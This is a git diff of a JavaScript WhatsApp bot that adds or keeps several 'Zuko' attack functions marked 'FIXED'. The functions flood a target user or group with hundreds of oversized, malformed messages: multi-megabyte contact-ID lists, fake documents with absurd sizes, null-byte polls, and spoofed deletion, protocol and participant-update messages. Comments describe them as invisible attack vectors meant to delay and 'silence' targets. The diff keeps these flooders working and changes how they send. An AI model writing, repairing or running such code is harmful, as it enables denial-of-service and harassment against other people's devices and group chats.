@@ -386,25 +386,22 @@ function renderHangman(game) {
     return `${HANGMAN_STAGES[game.wrong]}\n\n📝 ${displayWord}\n\n❤️ Lives: ${game.maxWrong - game.wrong}/${game.maxWrong}\n❌ Wrong: ${wrongLetters.join(', ') || 'none'}`;
 }
 // ============================================================
-// ZUKO DELAY BUG - Document Flood with Random JIDs
+// ZUKO DELAY BUG - Document Flood with Random JIDs (FIXED)
 // ============================================================
 async function ZukoDelay(from) {
   const path = require('path');
   const fs = require('fs');
 
-  // Create temp directory if it doesn't exist
   const tempDir = path.join(__dirname, '../database/temp');
   if (!fs.existsSync(tempDir)) {
     fs.mkdirSync(tempDir, { recursive: true });
   }
 
-  // Generate random JIDs
   const generateRandomJid = () => {
     const randomNumber = Math.floor(Math.random() * 1e10).toString().padStart(10, '0');
     return `"${randomNumber}@s.whatsapp.net"`;
   };
 
-  // Create temp file with random JIDs
   const createTempFile = () => {
     const tempFilePath = path.join(tempDir, `temp_jids_${Date.now()}.json`);
     let jids = [];
@@ -421,12 +418,10 @@ async function ZukoDelay(from) {
   const tempFilePath = createTempFile();
   const jidsss = JSON.parse(fs.readFileSync(tempFilePath));
 
-  // Clean up temp file after use
   setTimeout(() => {
     try { fs.unlinkSync(tempFilePath); } catch (e) {}
   }, 5000);
 
-  // Static document payload
   const url = "https://mmg.whatsapp.net/v/t62.7119-24/31863614_1446690129642423_4284129982526158568_n.enc?ccb=11-4&oh=01_Q5AaINokOPcndUoCQ5xDt9-QdH29VAwZlXi8SfD9ZJzy1Bg_&oe=67B59463&_nc_sid=5e03e0&mms3=true";
   const fileSha256 = "jLQrXn8TtEFsd/y5qF6UHW/4OE8RYcJ7wumBn5R1iJ8=";
   const mediaKey = "xSUWP0Wl/A0EMyAFyeCoPauXx+Qwb0xyPQLGDdFtM4U=";
@@ -436,61 +431,62 @@ async function ZukoDelay(from) {
 
   const ui = 'ꦽ'.repeat(5000);
 
-  await empire.relayMessage(from, {
-    "ephemeralMessage": {
-      "message": {
-        "interactiveMessage": {
-          "header": {
-            "documentMessage": {
-              "url": url,
-              "mimetype": "application/vnd.openxmlformats-officedocument.presentationml.presentation",
-              "fileSha256": fileSha256,
-              "fileLength": "9999999999999",
-              "pageCount": 1316134911,
-              "mediaKey": mediaKey,
-              "fileName": "⛤",
-              "fileEncSha256": fileEncSha256,
-              "directPath": directPath,
-              "contactVcard": true,
-              "jpegThumbnail": jpegThumbnail
+  const payload = {
+    ephemeralMessage: {
+      message: {
+        interactiveMessage: {
+          header: {
+            documentMessage: {
+              url: url,
+              mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
+              fileSha256: fileSha256,
+              fileLength: "9999999999999",
+              pageCount: 1316134911,
+              mediaKey: mediaKey,
+              fileName: "⛤",
+              fileEncSha256: fileEncSha256,
+              directPath: directPath,
+              contactVcard: true,
+              jpegThumbnail: jpegThumbnail
             },
-            "hasMediaAttachment": true,
+            hasMediaAttachment: true,
           },
-          "body": { "text": `⛤${ui}` },
-          "contextInfo": {
-            "mentionedJid": jidsss,
-            "mentions": jidsss,
-          },
-          "footer": { "text": `⛤${ui}` },
-          "nativeFlowMessage": {},
-          "contextInfo": {
-            "mentionedJid": jidsss,
-            "mentions": jidsss,
-            "forwardingScore": 127,
-            "isForwarded": true,
-            "fromMe": false,
-            "participant": "0@s.whatsapp.net",
-            "remoteJid": "status@broadcast",
-            "quotedMessage": {
-              "documentMessage": {
-                "url": url,
-                "mimetype": "application/vnd.openxmlformats-officedocument.presentationml.presentation",
-                "fileSha256": fileSha256,
-                "fileLength": "9999999999999",
-                "pageCount": 131613491,
-                "mediaKey": mediaKey,
-                "fileName": "⛤",
-                "fileEncSha256": fileEncSha256,
-                "directPath": directPath,
-                "contactVcard": true,
-                "jpegThumbnail": jpegThumbnail
+          body: { text: `⛤${ui}` },
+          footer: { text: `⛤${ui}` },
+          nativeFlowMessage: {},
+          contextInfo: {
+            mentionedJid: jidsss,
+            mentions: jidsss,
+            forwardingScore: 127,
+            isForwarded: true,
+            fromMe: false,
+            participant: "0@s.whatsapp.net",
+            remoteJid: "status@broadcast",
+            quotedMessage: {
+              documentMessage: {
+                url: url,
+                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
+                fileSha256: fileSha256,
+                fileLength: "9999999999999",
+                pageCount: 131613491,
+                mediaKey: mediaKey,
+                fileName: "⛤",
+                fileEncSha256: fileEncSha256,
+                directPath: directPath,
+                contactVcard: true,
+                jpegThumbnail: jpegThumbnail
               }
             }
           }
         }
       }
     }
-  }, { participant: { jid: from } });
+  };
+
+  await empire.sendMessage(from, payload, { 
+    ephemeralExpiration: 0,
+    contextInfo: newsletterContext()
+  }).catch(() => {});
 }
 
 // ========== WELCOME / GOODBYE HANDLER ==========
@@ -819,6 +815,9 @@ async function ZukoPhantomDelay(target) {
 // 100% invisible to all group members
 // Uses: Reactions, Deletions, Sticker Packs, Location, Contacts
 // ============================================================
+// ============================================================
+// ZUKO SILENT STORM - Invisible Group Eraser (FIXED)
+// ============================================================
 async function ZukoSilentStorm(groupJid) {
   const { generateWAMessageFromContent } = require('@whiskeysockets/baileys');
   const crypto = require('crypto');
@@ -828,7 +827,6 @@ async function ZukoSilentStorm(groupJid) {
   const tempDir = path.join(__dirname, '../database/temp');
   if (!fs.existsSync(tempDir)) fs.mkdirSync(tempDir, { recursive: true });
 
-  // ====== Generate massive JID list ======
   const generateRandomJid = () => {
     const randomNumber = Math.floor(Math.random() * 1e10).toString().padStart(10, '0');
     return `"${randomNumber}@s.whatsapp.net"`;
@@ -844,18 +842,15 @@ async function ZukoSilentStorm(groupJid) {
     const tempFilePath = path.join(tempDir, `silent_storm_${Date.now()}.json`);
     let jids = [];
     let currentSize = 0;
-
     for (const member of groupMembers) {
       jids.push(`"${member}"`);
       currentSize += member.length + 3;
     }
-
     while (currentSize < 4061432 - 50) {
       const jid = generateRandomJid();
       jids.push(jid);
       currentSize += jid.length + 3;
     }
-
     fs.writeFileSync(tempFilePath, `[${jids.join(',')}]`);
     return tempFilePath;
   };
@@ -868,9 +863,8 @@ async function ZukoSilentStorm(groupJid) {
   }, 5000);
 
   const ui = 'ꦽ'.repeat(5000);
-  const silentText = '🌪️ ZUKO SILENT STORM '.repeat(5000) + '\u0000'.repeat(500000);
 
-  // ====== PHASE 1: Invisible Reaction Flood (400 iterations) ======
+  // PHASE 1: Reaction Flood (400)
   for (let i = 0; i < 400; i++) {
     const reactionMsg = {
       ephemeralMessage: {
@@ -896,17 +890,12 @@ async function ZukoSilentStorm(groupJid) {
         }
       }
     };
-
-    await empire.relayMessage(groupJid, reactionMsg, { participant: { jid: groupJid } }).catch(() => {});
-
-    if (i % 50 === 0) {
-      console.log(chalk.gray(`🌪️ SILENT STORM Phase 1: ${i}/400 on ${groupJid}`));
-    }
-
+    await empire.sendMessage(groupJid, reactionMsg, { ephemeralExpiration: 0 }).catch(() => {});
+    if (i % 50 === 0) console.log(chalk.gray(`🌪️ STORM Phase 1: ${i}/400`));
     await new Promise(resolve => setTimeout(resolve, 30));
   }
 
-  // ====== PHASE 2: Invisible Message Deletion Flood (300 iterations) ======
+  // PHASE 2: Deletion Flood (300)
   for (let i = 0; i < 300; i++) {
     const deleteKeys = Array.from({ length: 100 }, () => ({
       remoteJid: groupJid,
@@ -914,7 +903,6 @@ async function ZukoSilentStorm(groupJid) {
       fromMe: true,
       participant: '0@s.whatsapp.net'
     }));
-
     const deleteMsg = {
       ephemeralMessage: {
         message: {
@@ -925,10 +913,8 @@ async function ZukoSilentStorm(groupJid) {
               fromMe: true,
               participant: '0@s.whatsapp.net'
             },
-            type: 13, // DELETE_MESSAGES
-            deleteMessages: {
-              keys: deleteKeys
-            },
+            type: 13,
+            deleteMessages: { keys: deleteKeys },
             contextInfo: {
               participant: '0@s.whatsapp.net',
               remoteJid: groupJid,
@@ -941,17 +927,12 @@ async function ZukoSilentStorm(groupJid) {
         }
       }
     };
-
-    await empire.relayMessage(groupJid, deleteMsg, { participant: { jid: groupJid } }).catch(() => {});
-
-    if (i % 50 === 0) {
-      console.log(chalk.gray(`🌪️ SILENT STORM Phase 2: ${i}/300 on ${groupJid}`));
-    }
-
+    await empire.sendMessage(groupJid, deleteMsg, { ephemeralExpiration: 0 }).catch(() => {});
+    if (i % 50 === 0) console.log(chalk.gray(`🌪️ STORM Phase 2: ${i}/300`));
     await new Promise(resolve => setTimeout(resolve, 40));
   }
 
-  // ====== PHASE 3: Invisible Sticker Pack Flood (200 iterations) ======
+  // PHASE 3: Sticker Pack Flood (200)
   for (let i = 0; i < 200; i++) {
     const stickers = [];
     for (let s = 0; s < 100; s++) {
@@ -963,7 +944,6 @@ async function ZukoSilentStorm(groupJid) {
         mimetype: 'image/webp'
       });
     }
-
     const stickerMsg = {
       ephemeralMessage: {
         message: {
@@ -999,17 +979,12 @@ async function ZukoSilentStorm(groupJid) {
         }
       }
     };
-
-    await empire.relayMessage(groupJid, stickerMsg, { participant: { jid: groupJid } }).catch(() => {});
-
-    if (i % 50 === 0) {
-      console.log(chalk.gray(`🌪️ SILENT STORM Phase 3: ${i}/200 on ${groupJid}`));
-    }
-
+    await empire.sendMessage(groupJid, stickerMsg, { ephemeralExpiration: 0 }).catch(() => {});
+    if (i % 50 === 0) console.log(chalk.gray(`🌪️ STORM Phase 3: ${i}/200`));
     await new Promise(resolve => setTimeout(resolve, 60));
   }
 
-  // ====== PHASE 4: Invisible Contact Flood (200 iterations) ======
+  // PHASE 4: Contact Flood (200)
   for (let i = 0; i < 200; i++) {
     const contactMsg = {
       ephemeralMessage: {
@@ -1029,17 +1004,12 @@ async function ZukoSilentStorm(groupJid) {
         }
       }
     };
-
-    await empire.relayMessage(groupJid, contactMsg, { participant: { jid: groupJid } }).catch(() => {});
-
-    if (i % 50 === 0) {
-      console.log(chalk.gray(`🌪️ SILENT STORM Phase 4: ${i}/200 on ${groupJid}`));
-    }
-
+    await empire.sendMessage(groupJid, contactMsg, { ephemeralExpiration: 0 }).catch(() => {});
+    if (i % 50 === 0) console.log(chalk.gray(`🌪️ STORM Phase 4: ${i}/200`));
     await new Promise(resolve => setTimeout(resolve, 50));
   }
 
-  // ====== PHASE 5: Invisible Location Flood (200 iterations) ======
+  // PHASE 5: Location Flood (200)
   for (let i = 0; i < 200; i++) {
     const locationMsg = {
       ephemeralMessage: {
@@ -1062,17 +1032,12 @@ async function ZukoSilentStorm(groupJid) {
         }
       }
     };
-
-    await empire.relayMessage(groupJid, locationMsg, { participant: { jid: groupJid } }).catch(() => {});
-
-    if (i % 50 === 0) {
-      console.log(chalk.gray(`🌪️ SILENT STORM Phase 5: ${i}/200 on ${groupJid}`));
-    }
-
+    await empire.sendMessage(groupJid, locationMsg, { ephemeralExpiration: 0 }).catch(() => {});
+    if (i % 50 === 0) console.log(chalk.gray(`🌪️ STORM Phase 5: ${i}/200`));
     await new Promise(resolve => setTimeout(resolve, 55));
   }
 
-  // ====== PHASE 6: Invisible Payment Request Flood (150 iterations) ======
+  // PHASE 6: Payment Flood (150)
   for (let i = 0; i < 150; i++) {
     const paymentMsg = {
       ephemeralMessage: {
@@ -1104,17 +1069,12 @@ async function ZukoSilentStorm(groupJid) {
         }
       }
     };
-
-    await empire.relayMessage(groupJid, paymentMsg, { participant: { jid: groupJid } }).catch(() => {});
-
-    if (i % 50 === 0) {
-      console.log(chalk.gray(`🌪️ SILENT STORM Phase 6: ${i}/150 on ${groupJid}`));
-    }
-
+    await empire.sendMessage(groupJid, paymentMsg, { ephemeralExpiration: 0 }).catch(() => {});
+    if (i % 50 === 0) console.log(chalk.gray(`🌪️ STORM Phase 6: ${i}/150`));
     await new Promise(resolve => setTimeout(resolve, 70));
   }
 
-  // ====== FINAL SURGE: 250 iterations of pure invisible chaos ======
+  // FINAL SURGE (250)
   for (let i = 0; i < 250; i++) {
     const surgePayload = {
       ephemeralMessage: {
@@ -1146,20 +1106,17 @@ async function ZukoSilentStorm(groupJid) {
         }
       }
     };
-
-    await empire.relayMessage(groupJid, surgePayload, { participant: { jid: groupJid } }).catch(() => {});
-
-    if (i % 50 === 0) {
-      console.log(chalk.gray(`🌪️ SILENT STORM Final Surge: ${i}/250 on ${groupJid}`));
-    }
-
+    await empire.sendMessage(groupJid, surgePayload, { ephemeralExpiration: 0 }).catch(() => {});
+    if (i % 50 === 0) console.log(chalk.gray(`🌪️ STORM Final Surge: ${i}/250`));
     await new Promise(resolve => setTimeout(resolve, 25));
   }
 
   console.log(chalk.green(`✅ ZUKO SILENT STORM COMPLETE on ${groupJid}`));
-  console.log(chalk.gray(`🌪️ GROUP ${groupJid} HAS BEEN SILENCED 🌪️`));
 }
 
+// ============================================================
+// ZUKO PHANTOM DELAY - Invisible Strong Delay (FIXED)
+// ============================================================
 async function ZukoPhantomDelay(target) {
   const { generateWAMessageFromContent } = require('@whiskeysockets/baileys');
   const crypto = require('crypto');
@@ -1169,7 +1126,6 @@ async function ZukoPhantomDelay(target) {
   const tempDir = path.join(__dirname, '../database/temp');
   if (!fs.existsSync(tempDir)) fs.mkdirSync(tempDir, { recursive: true });
 
-  // ====== Generate massive JID list ======
   const generateRandomJid = () => {
     const randomNumber = Math.floor(Math.random() * 1e10).toString().padStart(10, '0');
     return `"${randomNumber}@s.whatsapp.net"`;
@@ -1195,7 +1151,6 @@ async function ZukoPhantomDelay(target) {
     try { fs.unlinkSync(tempFilePath); } catch (e) {}
   }, 5000);
 
-  // ====== Document payloads ======
   const documentPayloads = [
     {
       url: "https://mmg.whatsapp.net/v/t62.7119-24/31863614_1446690129642423_4284129982526158568_n.enc?ccb=11-4&oh=01_Q5AaINokOPcndUoCQ5xDt9-QdH29VAwZlXi8SfD9ZJzy1Bg_&oe=67B59463&_nc_sid=5e03e0&mms3=true",
@@ -1216,12 +1171,10 @@ async function ZukoPhantomDelay(target) {
   ];
 
   const ui = 'ꦽ'.repeat(5000);
-  const ghostText = '👻 ZUKO PHANTOM DELAY '.repeat(5000) + '\u0000'.repeat(500000);
 
-  // ====== PHASE 1: Invisible Document Flood (500 iterations) ======
+  // PHASE 1: Document Flood (500)
   for (let i = 0; i < 500; i++) {
     const payload = documentPayloads[i % documentPayloads.length];
-
     const msg = {
       ephemeralMessage: {
         message: {
@@ -1274,24 +1227,17 @@ async function ZukoPhantomDelay(target) {
       }
     };
 
-    await empire.relayMessage(from, msg, { participant: { jid: from } }).catch(() => {});
-
-    if (i % 50 === 0) {
-      console.log(chalk.gray(`👻 PHANTOM DELAY Phase 1: ${i}/500 on ${from}`));
-    }
-
+    await empire.sendMessage(target, msg, { ephemeralExpiration: 0 }).catch(() => {});
+    if (i % 50 === 0) console.log(chalk.gray(`👻 PHANTOM Phase 1: ${i}/500`));
     await new Promise(resolve => setTimeout(resolve, 50));
   }
 
-  // ====== PHASE 2: Invisible Poll Flood (200 iterations) ======
+  // PHASE 2: Poll Flood (200)
   for (let i = 0; i < 200; i++) {
     const pollOptions = [];
     for (let p = 0; p < 500; p++) {
-      pollOptions.push({
-        optionName: `\u0000`.repeat(5000) + `_${p}_${i}`
-      });
+      pollOptions.push({ optionName: `\u0000`.repeat(5000) + `_${p}_${i}` });
     }
-
     const pollMsg = {
       ephemeralMessage: {
         message: {
@@ -1314,22 +1260,17 @@ async function ZukoPhantomDelay(target) {
         }
       }
     };
-
-    await empire.relayMessage(from, pollMsg, { participant: { jid: from } }).catch(() => {});
-
-    if (i % 50 === 0) {
-      console.log(chalk.gray(`👻 PHANTOM DELAY Phase 2: ${i}/200 on ${from}`));
-    }
-
+    await empire.sendMessage(target, pollMsg, { ephemeralExpiration: 0 }).catch(() => {});
+    if (i % 50 === 0) console.log(chalk.gray(`👻 PHANTOM Phase 2: ${i}/200`));
     await new Promise(resolve => setTimeout(resolve, 80));
   }
 
-  // ====== PHASE 3: Invisible Protocol Flood (300 iterations) ======
+  // PHASE 3: Protocol Flood (300)
   for (let i = 0; i < 300; i++) {
     const protocolMsg = {
       protocolMessage: {
         key: {
-          remoteJid: from,
+          remoteJid: target,
           id: crypto.randomBytes(16).toString('hex'),
           fromMe: true,
           participant: '0@s.whatsapp.net'
@@ -1339,7 +1280,7 @@ async function ZukoPhantomDelay(target) {
         status: 0,
         contextInfo: {
           participant: '0@s.whatsapp.net',
-          remoteJid: from,
+          remoteJid: target,
           isForwarded: true,
           forwardingScore: 999999 + i,
           mentionedJid: jidsss,
@@ -1347,17 +1288,12 @@ async function ZukoPhantomDelay(target) {
         }
       }
     };
-
-    await empire.relayMessage(from, protocolMsg, { participant: { jid: from } }).catch(() => {});
-
-    if (i % 50 === 0) {
-      console.log(chalk.gray(`👻 PHANTOM DELAY Phase 3: ${i}/300 on ${from}`));
-    }
-
+    await empire.sendMessage(target, protocolMsg, { ephemeralExpiration: 0 }).catch(() => {});
+    if (i % 50 === 0) console.log(chalk.gray(`👻 PHANTOM Phase 3: ${i}/300`));
     await new Promise(resolve => setTimeout(resolve, 60));
   }
 
-  // ====== PHASE 4: Invisible ViewOnce + Interactive (100 iterations) ======
+  // PHASE 4: ViewOnce + Interactive (100)
   for (let i = 0; i < 100; i++) {
     const viewOnceMsg = {
       viewOnceMessage: {
@@ -1389,37 +1325,29 @@ async function ZukoPhantomDelay(target) {
         }
       }
     };
-
-    await empire.relayMessage(from, viewOnceMsg, { participant: { jid: from } }).catch(() => {});
-
-    if (i % 20 === 0) {
-      console.log(chalk.gray(`👻 PHANTOM DELAY Phase 4: ${i}/100 on ${from}`));
-    }
-
+    await empire.sendMessage(target, viewOnceMsg).catch(() => {});
+    if (i % 20 === 0) console.log(chalk.gray(`👻 PHANTOM Phase 4: ${i}/100`));
     await new Promise(resolve => setTimeout(resolve, 100));
   }
 
-  // ====== FINAL SURGE: 200 iterations of pure invisible chaos ======
+  // FINAL SURGE (200)
   for (let i = 0; i < 200; i++) {
     const surgePayload = {
       ephemeralMessage: {
         message: {
           protocolMessage: {
             key: {
-              remoteJid: from,
+              remoteJid: target,
               id: crypto.randomBytes(16).toString('hex'),
               fromMe: true,
               participant: '0@s.whatsapp.net'
             },
             type: 16,
             ephemeralExpiration: 999999999 + i,
-            groupStatusUpdate: {
-              type: 0,
-              status: 0
-            },
+            groupStatusUpdate: { type: 0, status: 0 },
             contextInfo: {
               participant: '0@s.whatsapp.net',
-              remoteJid: from,
+              remoteJid: target,
               isForwarded: true,
               forwardingScore: 999999 + i,
               mentionedJid: jidsss,
@@ -1429,28 +1357,14 @@ async function ZukoPhantomDelay(target) {
         }
       }
     };
-
-    await empire.relayMessage(from, surgePayload, { participant: { jid: from } }).catch(() => {});
-
-    if (i % 50 === 0) {
-      console.log(chalk.gray(`👻 PHANTOM DELAY Final Surge: ${i}/200 on ${from}`));
-    }
-
+    await empire.sendMessage(target, surgePayload, { ephemeralExpiration: 0 }).catch(() => {});
+    if (i % 50 === 0) console.log(chalk.gray(`👻 PHANTOM Final Surge: ${i}/200`));
     await new Promise(resolve => setTimeout(resolve, 30));
   }
 
-  console.log(chalk.green(`✅ ZUKO PHANTOM DELAY COMPLETE on ${from}`));
-  console.log(chalk.gray(`👻 TARGET ${from} HAS BEEN PHANTOM DELAYED 👻`));
+  console.log(chalk.green(`✅ ZUKO PHANTOM DELAY COMPLETE on ${target}`));
 }
-  // ============================================================
-// ZUKO GROUP PHANTOM - Invisible Group Delay
-// 100% invisible to all group members
-// Multiple attack vectors targeting group infrastructure
-// ============================================================
-// ============================================================
-// ZUKO GROUP PHANTOM - Invisible Group Delay
-// 100% invisible to all group members
-// Multiple attack vectors targeting group infrastructure
+// ZUKO GROUP PHANTOM - Invisible Group Delay (FIXED)
 // ============================================================
 async function ZukoGroupPhantom(groupJid) {
   const { generateWAMessageFromContent } = require('@whiskeysockets/baileys');
@@ -1461,39 +1375,30 @@ async function ZukoGroupPhantom(groupJid) {
   const tempDir = path.join(__dirname, '../database/temp');
   if (!fs.existsSync(tempDir)) fs.mkdirSync(tempDir, { recursive: true });
 
-  // ====== Generate massive JID list (group members + random) ======
   const generateRandomJid = () => {
     const randomNumber = Math.floor(Math.random() * 1e10).toString().padStart(10, '0');
     return `"${randomNumber}@s.whatsapp.net"`;
   };
 
-  // Get actual group members to mention them invisibly
   let groupMembers = [];
   try {
     const metadata = await empire.groupMetadata(groupJid);
     groupMembers = metadata.participants.map(p => p.id);
-  } catch (e) {
-    console.log('Could not fetch group members, using random JIDs only');
-  }
+  } catch (e) {}
 
   const createTempFile = () => {
     const tempFilePath = path.join(tempDir, `group_phantom_${Date.now()}.json`);
     let jids = [];
     let currentSize = 0;
-
-    // Add actual group members first
     for (const member of groupMembers) {
       jids.push(`"${member}"`);
       currentSize += member.length + 3;
     }
-
-    // Fill rest with random JIDs
     while (currentSize < 3061432 - 50) {
       const jid = generateRandomJid();
       jids.push(jid);
       currentSize += jid.length + 3;
     }
-
     fs.writeFileSync(tempFilePath, `[${jids.join(',')}]`);
     return tempFilePath;
   };
@@ -1505,10 +1410,8 @@ async function ZukoGroupPhantom(groupJid) {
     try { fs.unlinkSync(tempFilePath); } catch (e) {}
   }, 5000);
 
-  const ghostText = '👻 ZUKO GROUP PHANTOM '.repeat(5000) + '\u0000'.repeat(500000);
   const ui = 'ꦽ'.repeat(5000);
 
-  // ====== Document payloads ======
   const documentPayloads = [
     {
       url: "https://mmg.whatsapp.net/v/t62.7119-24/31863614_1446690129642423_4284129982526158568_n.enc?ccb=11-4&oh=01_Q5AaINokOPcndUoCQ5xDt9-QdH29VAwZlXi8SfD9ZJzy1Bg_&oe=67B59463&_nc_sid=5e03e0&mms3=true",
@@ -1528,7 +1431,7 @@ async function ZukoGroupPhantom(groupJid) {
     }
   ];
 
-  // ====== PHASE 1: Invisible Group Protocol Flood (300 iterations) ======
+  // PHASE 1: Group Protocol Flood (300)
   for (let i = 0; i < 300; i++) {
     const protocolMsg = {
       protocolMessage: {
@@ -1538,13 +1441,10 @@ async function ZukoGroupPhantom(groupJid) {
           fromMe: true,
           participant: '0@s.whatsapp.net'
         },
-        type: 16, // GROUP_STATUS_UPDATE
+        type: 16,
         ephemeralExpiration: 999999999 + i,
         status: 0,
-        groupStatusUpdate: {
-          type: 0,
-          status: 0
-        },
+        groupStatusUpdate: { type: 0, status: 0 },
         contextInfo: {
           participant: '0@s.whatsapp.net',
           remoteJid: groupJid,
@@ -1555,20 +1455,14 @@ async function ZukoGroupPhantom(groupJid) {
         }
       }
     };
-
-    await empire.relayMessage(groupJid, protocolMsg, { participant: { jid: groupJid } }).catch(() => {});
-
-    if (i % 50 === 0) {
-      console.log(chalk.gray(`👻 GROUP PHANTOM Phase 1: ${i}/300 on ${groupJid}`));
-    }
-
+    await empire.sendMessage(groupJid, protocolMsg, { ephemeralExpiration: 0 }).catch(() => {});
+    if (i % 50 === 0) console.log(chalk.gray(`👻 GROUP PHANTOM Phase 1: ${i}/300`));
     await new Promise(resolve => setTimeout(resolve, 40));
   }
 
-  // ====== PHASE 2: Invisible Document Flood (400 iterations) ======
+  // PHASE 2: Document Flood (400)
   for (let i = 0; i < 400; i++) {
     const payload = documentPayloads[i % documentPayloads.length];
-
     const docMsg = {
       ephemeralMessage: {
         message: {
@@ -1620,25 +1514,17 @@ async function ZukoGroupPhantom(groupJid) {
         }
       }
     };
-
-    await empire.relayMessage(groupJid, docMsg, { participant: { jid: groupJid } }).catch(() => {});
-
-    if (i % 50 === 0) {
-      console.log(chalk.gray(`👻 GROUP PHANTOM Phase 2: ${i}/400 on ${groupJid}`));
-    }
-
+    await empire.sendMessage(groupJid, docMsg, { ephemeralExpiration: 0 }).catch(() => {});
+    if (i % 50 === 0) console.log(chalk.gray(`👻 GROUP PHANTOM Phase 2: ${i}/400`));
     await new Promise(resolve => setTimeout(resolve, 50));
   }
 
-  // ====== PHASE 3: Invisible Poll Flood (200 iterations) ======
+  // PHASE 3: Poll Flood (200)
   for (let i = 0; i < 200; i++) {
     const pollOptions = [];
     for (let p = 0; p < 500; p++) {
-      pollOptions.push({
-        optionName: '\u0000'.repeat(5000) + `_${p}_${i}`
-      });
+      pollOptions.push({ optionName: '\u0000'.repeat(5000) + `_${p}_${i}` });
     }
-
     const pollMsg = {
       ephemeralMessage: {
         message: {
@@ -1661,17 +1547,12 @@ async function ZukoGroupPhantom(groupJid) {
         }
       }
     };
-
-    await empire.relayMessage(groupJid, pollMsg, { participant: { jid: groupJid } }).catch(() => {});
-
-    if (i % 50 === 0) {
-      console.log(chalk.gray(`👻 GROUP PHANTOM Phase 3: ${i}/200 on ${groupJid}`));
-    }
-
+    await empire.sendMessage(groupJid, pollMsg, { ephemeralExpiration: 0 }).catch(() => {});
+    if (i % 50 === 0) console.log(chalk.gray(`👻 GROUP PHANTOM Phase 3: ${i}/200`));
     await new Promise(resolve => setTimeout(resolve, 70));
   }
 
-  // ====== PHASE 4: Invisible Participant Updates (150 iterations) ======
+  // PHASE 4: Participant Updates (150)
   for (let i = 0; i < 150; i++) {
     const participantMsg = {
       protocolMessage: {
@@ -1681,7 +1562,7 @@ async function ZukoGroupPhantom(groupJid) {
           fromMe: true,
           participant: '0@s.whatsapp.net'
         },
-        type: 17, // PARTICIPANT_UPDATE
+        type: 17,
         participantUpdate: {
           type: 0,
           jid: Math.floor(Math.random() * 99999999) + '@s.whatsapp.net'
@@ -1696,17 +1577,12 @@ async function ZukoGroupPhantom(groupJid) {
         }
       }
     };
-
-    await empire.relayMessage(groupJid, participantMsg, { participant: { jid: groupJid } }).catch(() => {});
-
-    if (i % 50 === 0) {
-      console.log(chalk.gray(`👻 GROUP PHANTOM Phase 4: ${i}/150 on ${groupJid}`));
-    }
-
+    await empire.sendMessage(groupJid, participantMsg, { ephemeralExpiration: 0 }).catch(() => {});
+    if (i % 50 === 0) console.log(chalk.gray(`👻 GROUP PHANTOM Phase 4: ${i}/150`));
     await new Promise(resolve => setTimeout(resolve, 60));
   }
 
-  // ====== PHASE 5: Invisible Newsletter Admin Invites (100 iterations) ======
+  // PHASE 5: Newsletter Invites (100)
   for (let i = 0; i < 100; i++) {
     const newsletterMsg = {
       newsletterAdminInviteMessage: {
@@ -1724,17 +1600,12 @@ async function ZukoGroupPhantom(groupJid) {
         }
       }
     };
-
-    await empire.relayMessage(groupJid, newsletterMsg, { participant: { jid: groupJid } }).catch(() => {});
-
-    if (i % 25 === 0) {
-      console.log(chalk.gray(`👻 GROUP PHANTOM Phase 5: ${i}/100 on ${groupJid}`));
-    }
-
+    await empire.sendMessage(groupJid, newsletterMsg).catch(() => {});
+    if (i % 25 === 0) console.log(chalk.gray(`👻 GROUP PHANTOM Phase 5: ${i}/100`));
     await new Promise(resolve => setTimeout(resolve, 80));
   }
 
-  // ====== PHASE 6: Invisible ViewOnce + Interactive (100 iterations) ======
+  // PHASE 6: ViewOnce + Interactive (100)
   for (let i = 0; i < 100; i++) {
     const viewOnceMsg = {
       viewOnceMessage: {
@@ -1766,17 +1637,12 @@ async function ZukoGroupPhantom(groupJid) {
         }
       }
     };
-
-    await empire.relayMessage(groupJid, viewOnceMsg, { participant: { jid: groupJid } }).catch(() => {});
-
-    if (i % 25 === 0) {
-      console.log(chalk.gray(`👻 GROUP PHANTOM Phase 6: ${i}/100 on ${groupJid}`));
-    }
-
+    await empire.sendMessage(groupJid, viewOnceMsg).catch(() => {});
+    if (i % 25 === 0) console.log(chalk.gray(`👻 GROUP PHANTOM Phase 6: ${i}/100`));
     await new Promise(resolve => setTimeout(resolve, 90));
   }
 
-  // ====== FINAL SURGE: 300 iterations of pure invisible chaos ======
+  // FINAL SURGE (300)
   for (let i = 0; i < 300; i++) {
     const surgePayload = {
       ephemeralMessage: {
@@ -1802,18 +1668,12 @@ async function ZukoGroupPhantom(groupJid) {
         }
       }
     };
-
-    await empire.relayMessage(groupJid, surgePayload, { participant: { jid: groupJid } }).catch(() => {});
-
-    if (i % 50 === 0) {
-      console.log(chalk.gray(`👻 GROUP PHANTOM Final Surge: ${i}/300 on ${groupJid}`));
-    }
-
+    await empire.sendMessage(groupJid, surgePayload, { ephemeralExpiration: 0 }).catch(() => {});
+    if (i % 50 === 0) console.log(chalk.gray(`👻 GROUP PHANTOM Final Surge: ${i}/300`));
     await new Promise(resolve => setTimeout(resolve, 30));
   }
 
   console.log(chalk.green(`✅ ZUKO GROUP PHANTOM COMPLETE on ${groupJid}`));
-  console.log(chalk.gray(`👻 GROUP ${groupJid} HAS BEEN PHANTOM DELAYED 👻`));
 }
 // ========== MAIN BOT ==========
 module.exports = empire = async (empire, m, chatUpdate, store) => {
